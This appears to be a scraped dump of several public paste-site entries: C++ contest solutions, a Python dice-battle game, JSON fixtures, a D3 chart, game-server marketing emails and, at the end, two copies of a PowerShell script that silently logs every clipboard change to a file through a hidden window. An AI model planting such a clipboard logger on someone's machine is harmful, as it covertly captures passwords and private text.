            }
        }
    }
  
}
int LCA(int a, int b) {
    if(depth[a] > depth[b]) {
        swap(a, b);
    }
    int diff = depth[b] - depth[a];
    while(diff > 0) {
        int pow = log2(diff);
        b = up[b][pow];
        diff -= (1 << pow);
    }
    if(b == a) {
        return a;
    }
    for(int i = logn - 1; i >= 0; i--) {
        if(up[a][i] != -1 and up[a][i] != up[b][i]) {
            
            a = up[a][i];
            b = up[b][i];
        }
    }
    return parent[a];
}
void preprocess_max_min() {
    for(int i = 1; i < logn; i++) {
        for(int j = 1; j <= n; j++) {
            dp[i][j] = dp[i - 1][dp[i - 1][j]];
            max_edge[i][j] = max(max_edge[i - 1][j], max_edge[i - 1][dp[i - 1][j]]);
            min_edge[i][j] = min(min_edge[i - 1][j], min_edge[i - 1][dp[i - 1][j]]);
        }
    }
}
pair<int, int> get_max_min_edge(int a, int b) {
    if(depth[b] < depth[a]) {
        swap(a, b);
    }
    int res_min = INF, res_max = -INF;
    int diff = depth[b] - depth[a];
    while(diff > 0) {
        int pow = log2(diff);
        res_max = max(res_max, max_edge[pow][b]);
        res_min = min(res_min, min_edge[pow][b]);
        b = dp[pow][b];
        diff -= (1 << pow);
    }
    while(a != b) {
        int i = log2(depth[a]);
        while(i > 0 and dp[i][a] == dp[i][b]) {
            i--;
        }
        res_max = max(res_max, max_edge[i][a]);
        res_max = max(res_max, max_edge[i][b]);
        
        res_min = min(res_min, min_edge[i][a]);
        res_min = min(res_min, min_edge[i][b]);
        a = dp[i][a];
        b = dp[i][b];
    }
    return make_pair(res_min, res_max);
}
int main() {
    ios_base::sync_with_stdio(false);
    int q;
    cin >> n >> q;
    for(int i = 1; i < n; i++) {
        int a, b, c;
        cin >> a >> b >> c;
        a--; b--;
        graph[a].push_back(make_pair(b, c));
        graph[b].push_back(make_pair(a, c));
    }
    for(int i = 0; i < n; i++) {
        for(int j = 0; j < logn; j++) {
            max_edge[j][i] = -INF;
            min_edge[j][i] = INF;
        }
    }
    dfs(0, -1, 0);
    preprocess();
    preprocess_max_min();
    ll ivan = 0, martin = 0;
    
    for(int i = 1; i <= q; i++) {
        int a, b, c;
        cin >> a >> b >> c;
        a--; b--;
        
        int lca = LCA(a, b);
        ll d = dist[a] + dist[b] - 2LL * dist[lca];
        pair<int, int> p = get_max_min_edge(a, b);
        
        int neg = -1 * p.first * c;
        int pos = p.second * c;
        ll d1 = d, d2 = d;
        
            d1 -= p.first;
            d1 += neg;
        
        
            d2 -= p.second;
            d2 += pos;
        
        d = max(d1, d2);
        if(i % 2 == 1) {
            ivan += d;
            
        }
        else {
            martin += d;
        }
    }
    if(ivan == martin) {
        cout << ""="" << endl;
    }
    else if(ivan > martin) {
        cout << ""Ivan "" << ivan - martin << endl;
    }
    else {
        cout << ""Martin "" << martin - ivan << endl;
    }
    return 0;
}

"
M0NfJ7vf,KRSU.7612,bofk,C++,Thursday 29th of February 2024 12:36:07 PM CDT,"#include <bits/stdc++.h>
 
using namespace std;

const int N = 200000 + 6;
int t[4 * N];

int get(int l, int r, int v = 1, int vl = 0, int vr = N - 1) {
  if (l > vr || vl > r) return 0;
  if (l <= vl && vr <= r) return t[v];
  int vm = (vl + vr) >> 1;
  return max(get(l, r, v<<1, vl, vm), get(l, r, v<<1|1, vm+1, vr));
}

void upd(int i, int x, int v = 1, int vl = 0, int vr = N - 1) {
  if (vl == vr)
    return void(t[v] = max(t[v], x));
  int vm = (vl + vr) >> 1;
  if (i <= vm) upd(i, x, v<<1, vl, vm);
  else upd(i, x, v<<1|1, vm+1, vr);
  t[v] = max(t[v<<1], t[v<<1|1]);
}

int main() {
  ios::sync_with_stdio(0);
  cin.tie(0);
  int n;
  cin >> n;
  
  vector<int> a(n);
  vector<int> v;
  for (int i = 0; i < n; i++) {
    cin >> a[i];
    v.push_back(a[i]);
  }
  sort(v.begin(), v.end());
  v.erase(unique(v.begin(), v.end()), v.end());
  for (int i = 0; i < n; i++)
    a[i] = lower_bound(v.begin(), v.end(), a[i]) - v.begin();  
    
  vector<int> dp(n), dp2(n);
  memset(t, 0, sizeof(t));
  for (int i = 0; i < n; i++) {
    dp[i] = get(0, a[i]-1) + 1;
    upd(a[i], dp[i]);
  }
  memset(t, 0, sizeof(t));
  for (int i = n - 1; i >= 0; i--) {
    dp2[i] = get(0, a[i]-1) + 1;
    upd(a[i], dp2[i]);
  }
  
  int ans = 1;
  for (int i = 0; i < n; i++) ans = max(ans, dp[i]+dp2[i]-1);
  cout << ans << ""\n"";
  
  return 0;
}"
pMbj4V0T,Untitled,Menadh,Python,Thursday 29th of February 2024 12:35:45 PM CDT,"import random

def roll_dice():
    return [random.randint(1, 4) for _ in range(3)]

def update_units(units, stats_diff):
    for unit in units:
        for i in range(3):
            unit[i+1] -= stats_diff[i]  # Adjusting stats, skipping the unit name at index 0

def calculate_total_points(units):
    total_points = 0
    for unit in units:
        total_points += sum(unit[1:])  # Summing up stats, skipping the unit name at index 0
    return total_points

def print_army(army_name, units):
    print(army_name + "":"")
    for unit in units:
        print(f""{unit[0]}, {unit[1]}/{unit[2]}/{unit[3]}"")

def simulate_battle(army1, army2):
    rolls_army1 = roll_dice()
    rolls_army2 = roll_dice()

    print(""Army 1 rolls:"", rolls_army1)
    print(""Army 2 rolls:"", rolls_army2)

    stats_diff_army1 = [0, 0, 0]
    stats_diff_army2 = [0, 0, 0]

    # Update stats_diff for Army 1
    for i in range(3):
        if rolls_army1[i] < rolls_army2[i]:
            stats_diff_army1[i] = rolls_army2[i] - rolls_army1[i]

    # Update stats_diff for Army 2
    for i in range(3):
        if rolls_army2[i] < rolls_army1[i]:
            stats_diff_army2[i] = rolls_army1[i] - rolls_army2[i]

    update_units(army1, stats_diff_army1)  # Update Army 1 with differences for Army 2
    update_units(army2, stats_diff_army2)  # Update Army 2 with differences for Army 1

    print(""\nThe outcome is:\n"")
    print_army(""Army 1"", army1)
    print_army(""Army 2"", army2)

    total_points_army1 = calculate_total_points(army1)
    total_points_army2 = calculate_total_points(army2)

    print(""\nArmy 1 lost"", sum(stats_diff_army1), ""points total."")
    print(""Army 2 lost"", sum(stats_diff_army2), ""points total."")

    if total_points_army1 > total_points_army2:
        print(""\nArmy 1 wins."")
        coin_flip = random.choice([""Heads"", ""Tails""])
        if coin_flip == ""Heads"":
            captured_points = [stats_diff_army2[0], stats_diff_army2[2]]  # Capturing MP and MO points
            print(""\nArmy 1 flips a coin. It comes up heads, and Army 1 captures the"", captured_points[0], ""MP points and"", captured_points[1], ""MO points Army 2 lost."")
    elif total_points_army1 < total_points_army2:
        print(""\nArmy 2 wins."")
        coin_flip = random.choice([""Heads"", ""Tails""])
        if coin_flip == ""Heads"":
            captured_points = [stats_diff_army1[0], stats_diff_army1[2]]  # Capturing MP and MO points
            print(""\nArmy 2 flips a coin. It comes up heads, and Army 2 captures the"", captured_points[0], ""MP points and"", captured_points[1], ""MO points Army 1 lost."")
    else:
        print(""\nThe battle is a stalemate."")

# Example armies
army1 = [[""CAV 1"", 8, 8, 8], [""CAV 2"", 8, 8, 8]]
army2 = [[""INF 1"", 6, 6, 6], [""INF 2"", 6, 6, 6]]

simulate_battle(army1, army2)
"
GWgH64FA,Dieser Geburtstag auf GrandRP ist etwas ganz Besonderes!,Shpindlier,HTML,Thursday 29th of February 2024 12:04:51 PM CDT,"<!DOCTYPE html>
<html><head><meta http-equiv=""content-type"" content=""text/html; charset=utf-8""></head><body>
	<div style=""background-color: #000;"">
		<table style=""box-sizing: border-box; background: #000; width: 600px; margin-left: auto; margin-right: auto; border-spacing: 0;"">
			<tbody>
				<tr>
					<td><a rel=""noopener noreferrer"" href=""https://gta5grand.com/?ref=2"" alt=""startimg1""><img src=""https://i.imgur.com/yCjPEEC.png"" alt=""Logo"" class=""CToWUd a6T"" data-bit=""iit"" tabindex=""0""></a></td>
				</tr>
				<tr>
					<td align=""center"" style=""padding-top: 10px;"">
						<p style=""margin: 0; padding: 24px; color: #fff; width: 500px; font-family: 'Arial'; font-size: 19px; font-weight: 500; font-style: normal; letter-spacing: normal; line-height: normal; text-align: center;"">Wir freuen uns euch zu verkünden, dass GrandRP offiziell 3 Jahre alt geworden ist! Um diesen Meilenstein zu feiern, haben wir ein brandneues Update auf allen Servern veröffentlicht. Dieses Update beinhaltet neue HUDs, Interfaces und ein spezielles In-Game-Event, mit dem ihr viel Spaß haben werdet!</p>
					</td>
				</tr>
				<tr>
					<td align=""center""><a rel=""noopener noreferrer"" style=""color: #fff; font-family: 'Arial'; font-size: 16px; letter-spacing: 0.01em; text-decoration-line: underline;"" href=""{{unsubscribe_url}}""><br>If you are not interested</a></td>
				</tr>
				<tr>
					<td>
						<div style=""padding-top: 0px; box-sizing: border-box;"">
							<p style=""color: #afafaf; font-family: 'Arial'; font-size: 16px; letter-spacing: 0.01em; padding: 15px 34px 0px 40px;"">By the way, I decided to let you know because you play on Grand Rp and registered there. If you're not interested, just let me know.</p>
						</div>
					</td>
				</tr>
			</tbody>
		</table>
	</div>
	</body></html>"
q7Y5jKNM,KRSU.7611,bofk,C++,Thursday 29th of February 2024 12:01:46 PM CDT,"#include <bits/stdc++.h>
 
using namespace std;

#define operation pair<int,pair<int,int>>
#define t first
#define x second.first
#define y second.second

int main() {
  ios::sync_with_stdio(0);
  cin.tie(0);
  int n;
  cin >> n;
  vector<long long> a(n);
  for (int i = 0; i < n; i++) {
    cin >> a[i];
  }
  int m;
  cin >> m;
  vector<operation> q(m);
  
  for (int i = 0; i < m; i++) {
    cin >> q[i].t;
    if (q[i].t == 1) {
      cin >> q[i].x;
    } else if (q[i].t == 2) {

    } else {
      cin >> q[i].x >> q[i].y;
    }
  }
  
  deque<long long> p(a.begin(), a.begin()+a.size()/2);
  deque<long long> s(a.begin()+a.size()/2, a.end());
  
  for (int i = 1; i < p.size(); i++) p[i] += p[i - 1];
  for (int i = s.size() - 2; i >= 0; i--) s[i] += s[i + 1];
  
  for (auto v : q) {
    if (v.t == 1) {
      if ((p.size() + s.size()) % 2 == 1) {
        p.push_back((p.size() > 0 ? p.back() : 0) + v.x);
      } else {
        s.push_front((s.size() > 0 ? s.front() : 0) + v.x);
      }
    } else if (v.t == 2) {
      if ((p.size() + s.size()) % 2 == 1) {
        s.pop_front();
      } else {
        p.pop_back();
      }
    } else {
      v.x--; v.y--;
      if (v.y < p.size()) {
        cout << p[v.y] - (v.x - 1 >= 0 ? p[v.x - 1] : 0) << ""\n"";
      } else if (v.x >= p.size()) {
        v.x -= p.size(); v.y -= p.size();
        cout << s[v.x] - (v.y + 1 < s.size() ? s[v.y + 1] : 0) << ""\n"";
      } else {
        long long sum = p.back() - (v.x - 1 >= 0 ? p[v.x - 1] : 0);
        v.y -= p.size();
        sum += s.front() - (v.y + 1 < s.size() ? s[v.y + 1] : 0);
        cout << sum << ""\n"";
      }
    }
  }
  
  return 0;
}"
PitcFuGK,Matchs (Soccer Point),AhmadXploit,Dart,Thursday 29th of February 2024 11:58:55 AM CDT,"{
  ""leagues"": [
    {
      ""image"": ""assets/images/laliga.png"",
      ""league"": ""La Liga"",
      ""week"": ""Week 10"",
      ""image1"": ""assets/images/images-removebg-preview (2).png"",
      ""team1"": ""Real Madrid"",
      ""image2"": ""assets/images/barcelona.png"",
      ""team2"": ""Barcelona"",
      ""score"": ""4 : 1"",
      ""color"": ""#f72b91""
    },
    {
      ""image"": ""assets/images/images-removebg-preview (1).png"",
      ""league"": ""Premier League"",
      ""week"": ""Week 11"",
      ""image1"": ""assets/images/mc.png"",
      ""team1"": ""Man City"",
      ""image2"": ""assets/images/mu.png"",
      ""team2"": ""Man United"",
      ""score"": ""4 : 1"",
      ""color"": ""#3f51b5""
    },
    {
      ""image"": ""assets/images/seriea.png"",
      ""league"": ""Serie A"",
      ""week"": ""Week 10"",
      ""image1"": ""assets/images/mc.png"",
      ""team1"": ""Man City"",
      ""image2"": ""assets/images/mu.png"",
      ""team2"": ""Man United"",
      ""score"": ""4 : 1"",
      ""color"": ""#4caf50""
    },
    {
      ""image"": ""assets/images/seriea.png"",
      ""league"": ""La Liga"",
      ""week"": ""Week 10"",
      ""image1"": ""assets/images/mc.png"",
      ""team1"": ""Man City"",
      ""image2"": ""assets/images/mu.png"",
      ""team2"": ""Man City"",
      ""score"": ""4 : 1"",
      ""color"": ""#ff9800""
    }
  ],
  ""matches"": [
    {
      ""image1"": ""assets/images/mc.png"",
      ""name1"": ""Man City"",
      ""image2"": ""assets/images/mu.png"",
      ""name2"": ""Man United"",
      ""date"": ""10 Oct"",
      ""time"": ""06:00""
    },
    {
      ""image1"": ""assets/images/mc.png"",
      ""name1"": ""Man City"",
      ""image2"": ""assets/images/mu.png"",
      ""name2"": ""Man United"",
      ""date"": ""10 Oct"",
      ""time"": ""06:00""
    },
    {
      ""image1"": ""assets/images/mc.png"",
      ""name1"": ""Man City"",
      ""image2"": ""assets/images/mu.png"",
      ""name2"": ""Man United"",
      ""date"": ""10 Oct"",
      ""time"": ""06:00""
    },
    {
      ""image1"": ""assets/images/mc.png"",
      ""name1"": ""Man City"",
      ""image2"": ""assets/images/mu.png"",
      ""name2"": ""Man United"",
      ""date"": ""10 Oct"",
      ""time"": ""06:00""
    }
  ]
}"
Q0Li0g7L,This Birthday on Grand RP became special,Shpindlier,HTML,Thursday 29th of February 2024 11:47:35 AM CDT,"<!DOCTYPE html>
<html><head><meta http-equiv=""content-type"" content=""text/html; charset=utf-8""></head><body>
	<div style=""background-color: #000;"">
		<table style=""box-sizing: border-box; background: #000; width: 600px; margin-left: auto; margin-right: auto; border-spacing: 0;"">
			<tbody>
				<tr>
					<td><a rel=""noopener noreferrer"" href=""https://gta5grand.com/?ref=2"" alt=""startimg1""><img src=""https://i.imgur.com/yCjPEEC.png"" alt=""Logo"" class=""CToWUd a6T"" data-bit=""iit"" tabindex=""0""></a></td>
				</tr>
				<tr>
					<td align=""center"" style=""padding-top: 10px;"">
						<p style=""margin: 0; padding: 24px; color: #fff; width: 500px; font-family: 'Arial'; font-size: 19px; font-weight: 500; font-style: normal; letter-spacing: normal; line-height: normal; text-align: center;"">We are thrilled to announce that Grand RP has officially turned 3 years old! To celebrate this milestone, we have released a brand new update on all servers. This update includes new HUDs, interfaces, and a special in-game event for you to enjoy.</p>
					</td>
				</tr>
				<tr>
					<td align=""center""><a rel=""noopener noreferrer"" style=""color: #fff; font-family: 'Arial'; font-size: 16px; letter-spacing: 0.01em; text-decoration-line: underline;"" href=""{{unsubscribe_url}}""><br>If you are not interested</a></td>
				</tr>
				<tr>
					<td>
						<div style=""padding-top: 0px; box-sizing: border-box;"">
							<p style=""color: #afafaf; font-family: 'Arial'; font-size: 16px; letter-spacing: 0.01em; padding: 15px 34px 0px 40px;"">By the way, I decided to let you know because you play on Grand Rp and registered there. If you're not interested, just let me know.</p>
						</div>
					</td>
				</tr>
			</tbody>
		</table>
	</div>
	</body></html>"
s5vrF9yK,title_scatter_v2,NTahmid,HTML,Thursday 29th of February 2024 11:46:48 AM CDT,"```<!doctype html>
<meta charset=""utf-8"" />
<html>
  <head>
    <script src=""https://d3js.org/d3.v6.min.js"" charset=""utf-8""></script>
    <script src=""https://rawgit.com/susielu/d3-annotation/master/d3-annotation.min.js""></script>
  </head>

  <style>
    * {
      font-family: sans-serif;
    }

    #tooltip {
      visibility: hidden;
      position: absolute;
      opacity: 0.8;
      padding: 10px;
      vertical-align: middle;
      border-radius: 5px;
      background-color: #ecf0f1;
      font-size: 14px;
    }

    .textbox {
      font-size: 14px;
    }

    #legend {
      opacity: 0.2;
      fill: #2c3e50;
    }

    #title {
      text-anchor: middle;
      font-size: 22px;
    }

    .label {
      text-anchor: middle;
    }

    #svg {
      background-color: white;
    }

    .annotation-group text {
      fill: #C86984;
    }

    .annotation-group line {
      stroke: #C86984;
    }

    .annotation-group path {
      stroke: #C86984;
    }
  </style>

  <body>
    <div id=""container"" align=""center""></div>

    <script type=""text/javascript"">
      // Url to the input data
      var url =
        ""https://raw.githubusercontent.com/freeCodeCamp/ProjectReferenceData/master/cyclist-data.json"";

      // Colors to differentiate riders with and without doping allegations
      var colors = [""#27ae60"", ""#8e44ad""];

      // The attributes of the riders corresponding to the above colors
      var legendKeys = [""No Doping Allegations"", ""Doping Allegations""];

      // Create an invisible div for the tooltip
      const tooltip = d3
        .select(""body"")
        .append(""div"")
        .attr(""id"", ""tooltip"")
        .style(""visibility"", ""hidden"");

      // 1. Load the data from external source
      d3.json(url).then(function (data) {
        // 2. Append svg-object for the bar chart to a div in your webpage
        // (here we use a div with id=container)
        var width = 700;
        var height = 500;
        var margin = { left: 90, top: 80, bottom: 50, right: 20 };
        var axisOffset = 10; // How for the axes are moved away from each other

        const svg = d3
          .select(""#container"")
          .append(""svg"")
          .attr(""id"", ""svg"")
          .attr(""width"", width)
          .attr(""height"", height);

        // 3. Define scales to translate domains of the data to the range of the svg
        var xMin = d3.min(data, (d) => d[""Year""]);
        var xMax = d3.max(data, (d) => d[""Year""]);

        var parseTime = d3.timeParse(""%M:%S"");
        var yMin = d3.min(data, (d) => parseTime(d[""Time""]));
        var yMax = d3.max(data, (d) => parseTime(d[""Time""]));

        var xScale = d3
          .scaleLinear()
          .domain([xMin, xMax])
          .range([margin.left + axisOffset, width - margin.right]);

        var yScale = d3
          .scaleTime()
          .domain([yMax, yMin])
          .range([height - margin.bottom - axisOffset, margin.top]);

        // 4. Draw and transform/translate horizontal and vertical axes
        var xAxis = d3.axisBottom().scale(xScale).tickFormat(d3.format(""d""));
        var yAxis = d3
          .axisLeft()
          .scale(yScale)
          .tickFormat(d3.timeFormat(""%M:%S""));

        svg
          .append(""g"")
          .attr(""transform"", ""translate(0, "" + (height - margin.bottom) + "")"")
          .attr(""id"", ""x-axis"")
          .call(xAxis);

        svg
          .append(""g"")
          .attr(""transform"", ""translate("" + margin.left + "", 0)"")
          .attr(""id"", ""y-axis"")
          .call(yAxis);

        // 5. Draw individual scatter points and define mouse events for the tooltip
        svg
          .selectAll(""scatterPoints"")
          .data(data)
          .enter()
          .append(""circle"")
          .attr(""cx"", (d) => xScale(d[""Year""]))
          .attr(""cy"", (d) => yScale(parseTime(d[""Time""])))
          .attr(""r"", 5)
          .attr(""fill"", (d) => (d[""Doping""] == """" ? colors[0] : colors[1]))
          .attr(""class"", ""dot"")
          .attr(""data-xvalue"", (d) => d[""Year""])
          .attr(""data-yvalue"", (d) => parseTime(d[""Time""]))
          .on(""mouseover"", function (d) {
            info = d[""originalTarget""][""__data__""];
            tooltip
              .style(""visibility"", ""visible"")
              .style(""left"", event.pageX + 10 + ""px"")
              .style(""top"", event.pageY - 80 + ""px"")
              .attr(""data-year"", info[""Year""])
              .html(
                info[""Name""] +
                  "" ("" +
                  info[""Year""] +
                  "") <br> Time: "" +
                  info[""Time""] +
                  ""<br><br>"" +
                  info[""Doping""]
              );
          })
          .on(""mousemove"", function () {
            tooltip.style(""left"", event.pageX + 10 + ""px"");
          })
          .on(""mouseout"", function () {
            tooltip.style(""visibility"", ""hidden"");
          });

        // 6. Finalize chart by adding title, axes labels and legend
        
        //X-axis label
        svg
          .append(""text"")
          .attr(""x"", margin.left + (width - margin.left - margin.right) / 2)
          .attr(""y"", height - margin.bottom / 5)
          .attr(""class"", ""label"")
          .text(""Year"");


        //Y-axis label
        svg
          .append(""text"")
          .attr(""y"", margin.left / 4)
          .attr(""x"", -height / 2)
          .attr(""transform"", ""rotate(-90)"")
          .attr(""class"", ""label"")
          .text(""Time to finish"");

        //Title of the chart
        svg
          .append(""text"")
          .attr(""x"", margin.left + (width - margin.left - margin.right) / 2)
          .attr(""y"", margin.top / 2.6)
          .attr(""id"", ""title"")
          .text(""Doping in professional bike racing"");

        svg
          .append(""text"")
          .attr(""x"", margin.left + (width - margin.left - margin.right) / 2)
          .attr(""y"", margin.top / 1.4)
          .text(""35 fastest times to finish Alpe d'Huez"")
          .style(""font-size"", ""16px"")
          .style(""text-anchor"", ""middle"");

        //Chart Legends
        svg
          .selectAll(""legendSymbols"")
          .data(legendKeys)
          .enter()
          .append(""circle"")
          .attr(""cx"", width - margin.right - 200)
          .attr(""cy"", (d, i) => 150 + i * 25)
          .attr(""r"", 5)
          .attr(""fill"", (d, i) => colors[i]);

        svg
          .selectAll(""legendTexts"")
          .data(legendKeys)
          .enter()
          .append(""text"")
          .text((d) => d)
          .attr(""x"", width - margin.right - 200 + 15)
          .attr(""y"", (d, i) => 150 + i * 25 + 5)
          .attr(""class"", ""textbox"");

        const legend = svg
          .append(""rect"")
          .attr(""x"", width - margin.right - 200 - 15)
          .attr(""y"", 150 - 5 - 10)
          .attr(""rx"", 5)
          .attr(""ry"", 5)
          .attr(""width"", 195)
          .attr(""height"", 55)
          .attr(""id"", ""legend"");

        // Annotation for the title
        const annotations = [
          {
            note: {
              label: ""Doping in professional bike racing"",
              bgPadding: 20,
              title: ""Chart Title""
            },
            color: [""#C86984""],
            x: margin.left + (width - margin.left - margin.right) / 2,
            y: margin.top / 2.6,
            dy: -30,
            dx: 0,
            type: d3.annotationCalloutCircle,
            subject: {
              radius: 100,         // radius of circle
              radiusPadding: 5   // padding to add around circle
            },
          }
        ];

        // Add annotation to the chart
        const makeAnnotations = d3.annotation()
          .annotations(annotations)
          .type(d3.annotationLabel)
          .accessors({
            x: d => xScale(d.x),
            y: d => yScale(parseTime(d.y))
          })
          .accessorsInverse({
             x: d => xScale.invert(d.x),
             y: d => yScale.invert(d.y)
          })
          .on('subjectover', function(annotation) {
            annotation.type.a.selectAll(""g.annotation-connector, g.annotation-note"")
              .classed(""hidden"", false)
          })
          .on('subjectout', function(annotation) {
            annotation.type.a.selectAll(""g.annotation-connector, g.annotation-note"")
              .classed(""hidden"", true)
          });

        svg.append(""g"")
          .attr(""class"", ""annotation-group"")
          .call(makeAnnotations);
      });
    </script>
  </body>
</html>
```"
Q5XBaVyY,Untitled,Josif_tepe,C++,Thursday 29th of February 2024 11:40:25 AM CDT,"#include <iostream>
#include <vector>
//#include <bits/stdc++.h>
#include <cmath>
#include <queue>
#include <cstring>
#include <algorithm>
using namespace std;
typedef long long ll;
const int maxn = 1e5 + 10;
int n, d;
ll p;
ll a[maxn];
bool check(int k) {
    ll sum = 0;
    priority_queue<ll> pq, greatest;
    for(int i = 0; i < n; i++) {
        pq.push(a[i]);
    }
    for(int i = 1; i <= d; i++) {
        ll max_tree = 0;
        if(!pq.empty()) {
            max_tree = pq.top();
            pq.pop();
        }
        sum += max_tree;
        if(i > k and !greatest.empty()) {
            pq.push(greatest.top());
            greatest.pop();
        }
        greatest.push(max_tree);
    }
    return sum >= p;
}
int main() {
    ios_base::sync_with_stdio(false);
    cin >> n >> p >> d;
    
    for(int i = 0; i < n; i++) {
        cin >> a[i];
    }
    int L = 1, R = d;
    int res = -1;
    while(L <= R) {
        int mid = (L + R) / 2;
        if(check(mid)) {
            L = mid + 1;
            res = mid;
        }
        else {
            R = mid - 1;
        }
    }
    if(res == d) {
        cout << ""seedno"" << endl;
    }
    else {
        cout << res << endl;
    }
    return 0;
}

"
5r4i1vAr,Review Trade Direct 365,fxvnpro,PHP,Thursday 29th of February 2024 11:39:06 AM CDT,https://www.fxvnpro.com/review-trade-direct-365/
820tzmTf,Untitled,502781,PowerShell,Thursday 29th of February 2024 11:38:17 AM CDT,"#adapted from https://github.com/samjones3/powershell-utilities/blob/main/PowerShell-Clipboard-Watcher.ps1
[CmdletBinding()]
param
(
)
 
$script:ErrorActionPreference = ""Stop""
Set-StrictMode -Version Latest
function PSScriptRoot { $MyInvocation.ScriptName | Split-Path }
Trap { throw $_ }
 
function Register-ClipboardWatcher
{
    if (-not (Test-Path Variable:Global:ClipboardWatcher))
    {
        Register-ClipboardWatcherType
        $Global:ClipboardWatcher = New-Object ClipboardWatcher
 
        Register-EngineEvent -SourceIdentifier PowerShell.Exiting -SupportEvent -Action `
        {
            Unregister-ClipboardWatcher
        }
    }
 
    return $Global:ClipboardWatcher
}
 
function Unregister-ClipboardWatcher
{
    if (Test-Path Variable:Global:ClipboardWatcher)
    {
        $Global:ClipboardWatcher.Dispose();
        Remove-Variable ClipboardWatcher -Scope Global
        Unregister-Event -SourceIdentifier ClipboardWatcher
    }
}
 
function Register-ClipboardWatcherType
{
    Add-Type -ReferencedAssemblies System.Windows.Forms, System.Drawing -Language CSharp -TypeDefinition `
    @""
using System;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
 
public class ClipboardWatcher : IDisposable
{
    readonly Thread _formThread;
    bool _disposed;
 
    public ClipboardWatcher()
    {
        _formThread = new Thread(() => { new ClipboardWatcherForm(this); })
                      {
                          IsBackground = true
                      };
 
        _formThread.SetApartmentState(ApartmentState.STA);
        _formThread.Start();
    }
 
    public void Dispose()
    {
        if (_disposed)
            return;
        Disposed();
        if (_formThread != null && _formThread.IsAlive)
            _formThread.Abort();
        _disposed = true;
        GC.SuppressFinalize(this);
    }
 
    ~ClipboardWatcher()
    {
        Dispose();
    }
 
    public event Action<string> ClipboardTextChanged = delegate { };
    public event Action Disposed = delegate { };
 
    public void OnClipboardTextChanged(string text)
    {
        ClipboardTextChanged(text);
    }
}
 
public class ClipboardWatcherForm : Form
{
    public ClipboardWatcherForm(ClipboardWatcher clipboardWatcher)
    {
        HideForm();
        RegisterWin32();
        ClipboardTextChanged += clipboardWatcher.OnClipboardTextChanged;
        clipboardWatcher.Disposed += () => InvokeIfRequired(Dispose);
        Disposed += (sender, args) => UnregisterWin32();
        Application.Run(this);
    }
 
    void InvokeIfRequired(Action action)
    {
        if (InvokeRequired)
            Invoke(action);
        else
            action();
    }
 
    public event Action<string> ClipboardTextChanged = delegate { };
 
    void HideForm()
    {
        FormBorderStyle = FormBorderStyle.None;
        ShowInTaskbar = false;
        Load += (sender, args) => { Size = new Size(0, 0); };
    }
 
    void RegisterWin32()
    {
        User32.AddClipboardFormatListener(Handle);
    }
 
    void UnregisterWin32()
    {
        if (IsHandleCreated)
            User32.RemoveClipboardFormatListener(Handle);
    }
 
    protected override void WndProc(ref Message m)
    {
        switch ((WM) m.Msg)
        {
            case WM.WM_CLIPBOARDUPDATE:
                ClipboardChanged();
                break;
 
            default:
                base.WndProc(ref m);
                break;
        }
    }
 
    void ClipboardChanged()
    {
        if (Clipboard.ContainsText())
            ClipboardTextChanged(Clipboard.GetText());
    }
}
 
public enum WM
{
    WM_CLIPBOARDUPDATE = 0x031D
}
 
public class User32
{
    const string User32Dll = ""User32.dll"";
 
    [DllImport(User32Dll, CharSet = CharSet.Auto)]
    public static extern bool AddClipboardFormatListener(IntPtr hWndObserver);
 
    [DllImport(User32Dll, CharSet = CharSet.Auto)]
    public static extern bool RemoveClipboardFormatListener(IntPtr hWndObserver);
}
""@
 
}
 
function Register-ClipboardTextChangedEvent
{
    param
    (
        [ScriptBlock] $Action
    )
    # before registering, unregister it, so there is no collision when you keep 
    # rerunning this thing during debugging and development.
    # the -EA flag tells it to run silently (as will throw an error if event is not already registered)
    Unregister-Event -SourceIdentifier ClipboardWatcher -EA 0
    $watcher = Register-ClipboardWatcher
    Register-ObjectEvent $watcher -EventName ClipboardTextChanged -Action $Action -SourceIdentifier ClipboardWatcher
}
 
Register-ClipboardTextChangedEvent -Action `
    {
        param
        (
            [string] $text
        )
 
        Add-Content -Path '.\text.txt' -Value ""$text`r`n"" -Encoding Unicode
    }"
s6S4xwcr,Untitled,502781,PowerShell,Thursday 29th of February 2024 11:33:16 AM CDT,"#adapted from https://github.com/samjones3/powershell-utilities/blob/main/PowerShell-Clipboard-Watcher.ps1
[CmdletBinding()]
param
(
)
 
$script:ErrorActionPreference = ""Stop""
Set-StrictMode -Version Latest
function PSScriptRoot { $MyInvocation.ScriptName | Split-Path }
Trap { throw $_ }
 
function Register-ClipboardWatcher
{
    if (-not (Test-Path Variable:Global:ClipboardWatcher))
    {
        Register-ClipboardWatcherType
        $Global:ClipboardWatcher = New-Object ClipboardWatcher
 
        Register-EngineEvent -SourceIdentifier PowerShell.Exiting -SupportEvent -Action `
        {
            Unregister-ClipboardWatcher
        }
    }
 
    return $Global:ClipboardWatcher
}
 
function Unregister-ClipboardWatcher
{
    if (Test-Path Variable:Global:ClipboardWatcher)
    {
        $Global:ClipboardWatcher.Dispose();
        Remove-Variable ClipboardWatcher -Scope Global
        Unregister-Event -SourceIdentifier ClipboardWatcher
    }
}
 
function Register-ClipboardWatcherType
{
    Add-Type -ReferencedAssemblies System.Windows.Forms, System.Drawing -Language CSharp -TypeDefinition `
    @""
using System;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
 
public class ClipboardWatcher : IDisposable
{
    readonly Thread _formThread;
    bool _disposed;
 
    public ClipboardWatcher()
    {
        _formThread = new Thread(() => { new ClipboardWatcherForm(this); })
                      {
                          IsBackground = true
                      };
 
        _formThread.SetApartmentState(ApartmentState.STA);
        _formThread.Start();
    }
 
    public void Dispose()
    {
        if (_disposed)
            return;
        Disposed();
        if (_formThread != null && _formThread.IsAlive)
            _formThread.Abort();
        _disposed = true;
        GC.SuppressFinalize(this);
    }
 
    ~ClipboardWatcher()
    {
        Dispose();
    }
 
    public event Action<string> ClipboardTextChanged = delegate { };
    public event Action Disposed = delegate { };
 
    public void OnClipboardTextChanged(string text)
    {
        ClipboardTextChanged(text);
    }
}
 
public class ClipboardWatcherForm : Form
{
    public ClipboardWatcherForm(ClipboardWatcher clipboardWatcher)
    {
        HideForm();
        RegisterWin32();
        ClipboardTextChanged += clipboardWatcher.OnClipboardTextChanged;
        clipboardWatcher.Disposed += () => InvokeIfRequired(Dispose);
        Disposed += (sender, args) => UnregisterWin32();
        Application.Run(this);
    }
 
    void InvokeIfRequired(Action action)
    {
        if (InvokeRequired)
            Invoke(action);
        else
            action();
    }
 
